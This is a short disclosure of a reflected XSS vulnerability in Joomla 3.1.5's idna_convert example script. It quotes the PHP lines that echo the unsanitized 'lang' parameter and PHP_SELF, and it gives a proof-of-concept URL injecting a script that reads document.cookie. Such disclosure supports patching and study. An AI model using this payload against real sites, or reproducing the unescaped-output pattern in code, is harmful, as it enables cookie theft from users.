[Joomla](http://www.joomla.org) core `3.1.5` suffers from a reflected XSS vulnerability that allows to inject HTML and malicious scripts. This can be exploited by malicious people to steal cookies and other sensitive information of other legitimate users in the context of the affected website. 

##  Vulnerability 

The affected file `libraries/idna_convert/example.php` has multiple injection points; 

The unsanitized `lang` parameter in line 24:

~~~ { php }
if (isset($_REQUEST['lang'])) {
    if ('de' == $_REQUEST['lang'] || 'en' == $_REQUEST['lang']) $lang = $_REQUEST['lang'];
    $add .= '<input type="hidden" name="lang" value="'.$_REQUEST['lang'].'" />'."\n";
}
~~~

While lines 112 and 119 print out the unsanitized file name:

~~~ { php }
     <form action="<?php echo $_SERVER['PHP_SELF']; ?>" method="get">
~~~

The attacker can exploit these weaknesses to execute arbitrary HTML and script code tricking a legitimate logged-in user to visit a malicious crafted url:

~~~ { html }
http://localhost/joomla/libraries/idna_convert/example.php?lang="><script>alert(document.cookie);</script><!--
~~~
